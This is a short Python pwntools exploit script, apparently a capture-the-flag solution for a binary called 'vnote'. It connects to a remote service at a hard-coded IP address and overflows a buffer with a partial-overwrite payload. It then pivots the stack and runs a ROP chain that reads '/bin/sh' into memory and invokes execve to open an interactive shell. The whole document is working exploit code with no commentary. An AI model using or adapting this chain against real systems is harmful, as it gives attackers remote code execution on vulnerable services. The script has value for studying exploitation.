from pwn import *

context.terminal = "tmux splitw -h".split()
elf = context.binary = ELF('vnote')
#p = elf.process()
p = remote('103.181.183.216', 17002)
#gdb.attach(p, "b * 0x0000000000401a8f")

payload = b'f' * 32 + b'\x98'

p.sendlineafter(b': ', payload)
sleep(0.5)

prax = 0x450747
prdi = 0x401d87
prsi = 0x40a67e
prdx_prbx = 0x48656b
prsp = 0x401b4a
sh = 0x4b042c
syscall = 0x0000000000401a8f

payload1 = cyclic(72)
payload1 += p64(prsp)
payload1 += p64(0x4c9320)

payload2 = p64(prax) + p64(0)
payload2 += p64(prdi) + p64(0)
payload2 += p64(prsi) + p64(0x4c7000)
payload2 += p64(prdx_prbx) + p64(16) + p64(0)
payload2 += p64(syscall)
payload2 += p64(prax) + p64(59)
payload2 += p64(prdi) + p64(0x4c7000)
payload2 += p64(prsi) + p64(0)
payload2 += p64(prdx_prbx) + p64(0) * 2
payload2 += p64(syscall)

p.sendlineafter(b': ', payload2)
p.sendlineafter(b': ', payload1)
sleep(0.5)

p.send(b'/bin/sh\x00')
p.interactive()
